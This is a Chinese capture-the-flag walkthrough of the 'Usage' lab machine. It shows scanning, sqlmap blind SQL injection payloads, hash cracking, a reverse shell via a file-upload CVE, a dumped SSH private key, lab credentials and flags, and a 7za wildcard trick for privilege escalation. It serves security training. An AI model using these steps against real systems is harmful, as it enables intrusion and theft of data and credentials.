# 服务

```
┌──(root㉿kali)-[~]
└─# nmap -sV -Pn -A 10.10.11.18                                                               
Starting Nmap 7.93 ( https://nmap.org ) at 2024-07-09 06:05 EDT
Nmap scan report for 10.10.11.18
Host is up (0.44s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0f8fdd304b807a063dd37dfd7eeca78 (ECDSA)
|_  256 bd22f5287727fb65baf6fd2f10c7828f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=7/9%OT=22%CT=1%CU=38731%PV=Y%DS=2%DC=T%G=Y%TM=668D0BAB
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11
OS:NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 23/tcp)
HOP RTT       ADDRESS
1   299.27 ms 10.10.16.1
2   544.06 ms 10.10.11.18

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.10 seconds

```

写hosts文件
```
echo "10.10.11.18 usage.htb">>/etc/hosts
```

首页发现子域名
```
echo "10.10.11.18 admin.usage.htb">>/etc/hosts
```

在admin.usage.htb首页源代码发现路径laravel-admin，可能cms就是laravel-admin


忘记密码页面存在sql注入
```
┌──(root㉿kali)-[~/htb/Usage]
└─# sqlmap -r data1  --risk=3 --level=3 --batch -p "email,password" 
        ___
       __H__                                                                                                        
 ___ ___[)]_____ ___ ___  {1.8.2#stable}                                                                            
|_ -| . [,]     | .'| . |                                                                                           
|___|_  [.]_|_|_|__,|  _|                                                                                           
      |_|V...       |_|   https://sqlmap.org                                                                        

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:27:35 /2024-07-10/

...
sqlmap identified the following injection point(s) with a total of 544 HTTP(s) requests:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: _token=ZFpGbuhHmw1uc9cV0lsPHW2ZVyOKWJggSaYk0jfZ&email=123' AND 6159=(SELECT (CASE WHEN (6159=6159) THEN 6159 ELSE (SELECT 7949 UNION SELECT 1014) END))-- LtMp

    Type: time-based blind
    Title: MySQL > 5.0.12 AND time-based blind (heavy query)
    Payload: _token=ZFpGbuhHmw1uc9cV0lsPHW2ZVyOKWJggSaYk0jfZ&email=123' AND 5880=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- qShS
---
[23:49:17] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL > 5.0.12
[23:49:20] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 246 times
[23:49:20] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/usage.htb'

[*] ending @ 23:49:20 /2024-07-10/

```

数据库
```
available databases [3]:
[*] information_schema
[*] performance_schema
[*] usage_blog

```

admin哈希
```
┌──(root㉿kali)-[~/htb/Usage]
└─# sqlmap -r data1  --risk=3 --level=3 --batch -p "email"  --technique B -D usage_blog -T admin_users -C "username,password" --dump
...
1
[01:51:54] [INFO] retrieved: $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2
[02:05:15] [INFO] retrieved: admin
Database: usage_blog
Table: admin_users
[1 entry]
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 |
+----------+--------------------------------------------------------------+

```

得到明文密码: whatever1
```
┌──(root㉿kali)-[~/htb/Usage]
└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt  
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
whatever1        (?)     
1g 0:00:00:21 DONE (2024-07-11 02:09) 0.04551g/s 73.73p/s 73.73c/s 73.73C/s alexis1..serena
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

# cve-2023-24249

![](Usage_files/1.jpg)

上传照片，修改请求信息，插入php代码

收到rev shell
```
┌──(root㉿kali)-[~/htb/Usage]
└─# nc -lnvp 443            
listening on [any] 443 ...
connect to [10.10.16.28] from (UNKNOWN) [10.10.11.18] 48728
Linux usage 5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 06:47:32 up 17 min,  1 user,  load average: 0.15, 0.06, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1000(dash) gid=1000(dash) groups=1000(dash)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1000(dash) gid=1000(dash) groups=1000(dash)
$ cd /home
$ ls
dash
xander
$ cd dash
$ ls
user.txt
$ cat user.txt
278b7ad898bb51e69cdadfecedad2a39

```

ssh秘钥
```
$ cd .ssh
$ ls
authorized_keys
id_rsa
id_rsa.pub
$ ll
/bin/sh: 11: ll: not found
$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
63zj5LQZw2/NvnAAAACmRhc2hAdXNhZ2U=
-----END OPENSSH PRIVATE KEY-----
$ 

```

要密码


写公钥进authorized_keys
```
echo "ssh-rsa AAAAB3NzaC1yc2EA....otts+qrKc+cV0= root@kali" >> ~/.ssh/authorized_keys
```

ssh登录
```
┌──(root㉿kali)-[~/htb/Usage]
└─# ssh dash@10.10.11.18 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Thu Jul 11 06:53:40 AM UTC 2024

  System load:  0.0166015625      Processes:             232
  Usage of /:   65.6% of 6.53GB   Users logged in:       1
  Memory usage: 20%               IPv4 address for eth0: 10.10.11.18
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Apr  8 12:35:43 2024 from 10.10.14.40
dash@usage:~$ 

```

数据库密码：staff：s3cr3t_c0d3d_1uth
```
╔══════════╣ Analyzing Env Files (limit 70)
-rwxrwxr-x 1 dash dash 1176 Aug 23  2023 /var/www/html/project_admin/.env                                                                         

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=usage_blog
DB_USERNAME=staff
DB_PASSWORD=s3cr3t_c0d3d_1uth
BROADCAST_DRIVER=log

```


内网
```
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1271/nginx: worker                                                
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:2812          0.0.0.0:*               LISTEN      6053/monit          
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22          
```

密码:
```
mysql> select name,email,password from users;
+------+---------------+--------------------------------------------------------------+
| name | email         | password                                                     |
+------+---------------+--------------------------------------------------------------+
| raj  | raj@raj.com   | $2y$10$7ALmTTEYfRVd8Rnyep/ck.bSFKfXfsltPLkyQqSp/TT7X1wApJt4. |
| raj  | raj@usage.htb | $2y$10$rbNCGxpWp1HSpO1gQX4uPO.pDg1nszoI/UhwHvfHDdfdfo9VmDJsa |
+------+---------------+--------------------------------------------------------------+

```

密码都是：xander


在home页面文件发现一个密码:3nc0d3d_pa$$w0rd
横向提权到xander
```
dash@usage:~$ \cat .monitrc 
#Monitoring Interval in Seconds
set daemon  60

#Enable Web Access
set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd

#Apache
check process apache with pidfile "/var/run/apache2/apache2.pid"
    if cpu > 80% for 2 cycles then alert


#System Monitoring 
check system usage
    if memory usage > 80% for 2 cycles then alert
    if cpu usage (user) > 70% for 2 cycles then alert
        if cpu usage (system) > 30% then alert
    if cpu usage (wait) > 20% then alert
    if loadavg (1min) > 6 for 2 cycles then alert 
    if loadavg (5min) > 4 for 2 cycles then alert
    if swap usage > 5% then alert

check filesystem rootfs with path /
       if space usage > 80% then alert
dash@usage:~$ su xander
Password: 
xander@usage:/home/dash$ 

```


# 提权

```
xander@usage:~$ sudo -l
Matching Defaults entries for xander on usage:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management

```


查看
```
xander@usage:/tmp$ strings /usr/bin/usage_management
/lib64/ld-linux-x86-64.so.2
chdir
__cxa_finalize
__libc_start_main
puts
system
__isoc99_scanf
perror
printf
libc.so.6
GLIBC_2.7
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
/var/www/html
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
Error changing working directory to /var/www/html
/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql
Password has been reset.
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 
Invalid choice.

```

注意
```
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
```

GPT解释：
```
这条命令使用 7-Zip 工具（7za）创建一个名为 project.zip 的 ZIP 压缩文件，并将当前目录下的所有文件和子目录添加到压缩文件中。

具体解释如下：

/usr/bin/7za: 这是 7-Zip 工具的路径，指定要使用的压缩工具的位置。
a: 这是 7-Zip 工具的命令之一，用于创建压缩文件。
/var/backups/project.zip: 这是要创建的 ZIP 压缩文件的路径和名称。在这个例子中，压缩文件将被保存在 /var/backups/ 目录下，并命名为 project.zip。
-tzip: 这是一个选项，指定压缩文件的格式为 ZIP 格式。通过指定 -tzip，7-Zip 将使用 ZIP 格式进行压缩。
-snl: 这是一个选项，禁用对压缩文件内部文件名的短文件名转换。默认情况下，7-Zip 会根据操作系统的要求对文件名进行转换，以确保在不同的操作系统上都能正确解压缩。通过指定 -snl，文件名将保持原样，不进行转换。
-mmt: 这是一个选项，启用多线程压缩。通过启用多线程，7-Zip 可以并行处理多个文件，从而提高压缩速度。特别是在多核处理器系统上，这个选项可以充分利用多个处理器核心来加速压缩过程。
-- *: 这是一个通配符，表示将当前目录下的所有文件和子目录添加到压缩文件中。其中 -- 用于分隔选项和参数，* 表示匹配当前目录下的所有文件和目录（除了以点开头的隐藏文件）。
注意：具体的操作结果可能因为系统环境和文件结构的不同而有所变化。
```

参考[hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks)里的提权方法

利用7z和通配符提权

```
xander@usage:/var/www/html$ touch '@root.txt'
xander@usage:/var/www/html$ ln -s -r /root/root.txt root.txt
xander@usage:/var/www/html$ sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7763 64-Core Processor                 (A00F11),ASM,AES-NI)

Open archive: /var/backups/project.zip
--       
Path = /var/backups/project.zip
Type = zip
Physical Size = 54968084

Scanning the drive:
          
WARNING: No more files
4e9a6eefc71406538dff4f2179268fd3

2984 folders, 17948 files, 114773865 bytes (110 MiB)                       

Updating archive: /var/backups/project.zip

Items to compress: 20932

                                                                               
Files read from disk: 17948
Archive size: 54968084 bytes (53 MiB)

Scan WARNINGS for files and folders:

4e9a6eefc71406538dff4f2179268fd3 : No more files
----------------
Scan WARNINGS: 1

```

可以直接读取到root.txt了

![](Usage_files/2.jpg)